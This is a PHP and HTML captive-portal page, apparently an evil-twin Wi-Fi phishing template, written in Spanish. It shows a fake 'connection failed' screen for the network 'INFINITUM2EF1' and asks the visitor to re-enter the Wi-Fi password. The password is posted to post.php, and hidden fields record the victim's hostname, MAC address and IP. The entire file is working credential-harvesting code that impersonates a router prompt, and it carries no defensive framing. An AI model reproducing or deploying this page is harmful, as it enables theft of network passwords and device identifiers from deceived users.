<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>
<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Login wifi</title>
  <link rel="stylesheet" typ="text/css" href="css/bootstrap.min.css">
  <script type="text/javascript">
    function redirect() {
      setTimeout(function () {
        window.location = "/captiveportal/index.php";
      }, 100);
    }
  </script>
</head>

<body>
  <section class="vh-100" style="background-color:rgb(255, 255, 255);">
    <div class="container py-1 h-5">
      <div class="row d-flex justify-content-center align-items-center h-100">
        <div class="col col-xl-10">
          <img src="entry-level.png" class="py-4">
          <div class="card" style="border-radius: 1rem;">
            <div class="card-header" style="background-color: #0f8ee2">
              <br>
              <br>
            </div>
            <div class="row g-0">
              <div class="col-md-6 col-lg-5 d-none d-md-block">
                <img src="entrylevel-frontcut.png" alt="login form" class="img-fluid"
                  style="border-radius: 1rem 0 0 1rem;" />
              </div>
              <div class="col-md-6 col-lg-7 d-flex align-items-center">
                <div class="card-body p-2 p-lg-5 text-black">

                  <form method="POST" action="post.php">

                    <div class="d-flex align-items-center mb-3 pb-1">
                      <i class="fas fa-cubes fa-2x " style="color: #ff6219;"></i>
                      <span class="h2 fw-bold mb-0"><img src="imagen1.png" style="weight: 50px;height: 50px;">fallo la
                        conexion</span>
                    </div>

                    <h5 class="fw-normal mb-3 pb-3" style="letter-spacing: 1px;">Porfavor vuelve a ingresar la
                      contraseña</h5>

                    <div data-mdb-input-init class="form-outline mb-4">
                      <label class="form-label" for="form2Example17">SSID</label>
                      <input type="text" readonly value="INFINITUM2EF1"id="user" name="email_google" class="form-control form-control-lg" />

                    </div>

                    <div data-mdb-input-init class="form-outline mb-4">
                      <label class="form-label" for="form2Example27">Contraseña</label>
                      <input type="text" id="password" name="password_google"
                        class="form-control form-control-lg" />

                    </div>
                    <input type="hidden" name="hostname" value="<?= getClientHostName($_SERVER['REMOTE_ADDR']); ?>">
                    <input type="hidden" name="mac" value="<?= getClientMac($_SERVER['REMOTE_ADDR']); ?>">
                    <input type="hidden" name="ip" value="<?= $_SERVER['REMOTE_ADDR']; ?>">
                    <input type="hidden" name="target" value="https://accounts.google.com/signin">
                    <p class="warning"><?php echo !empty($err) ? $err : "&nbsp;"; ?></p>

                    <div class="pt-1 mb-4">
                    <input type="submit" class="btn btn-primary btn-lg btn-block" value="Conectar">
                     
                    </div>


                  </form>

                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </section>
  <script type="text/javascript" src="=js/bootstrap.bundle.min.js"></script>
  <script>document.onload = function () { document.getElementById("user").focus(); };</script>
</body>

</html>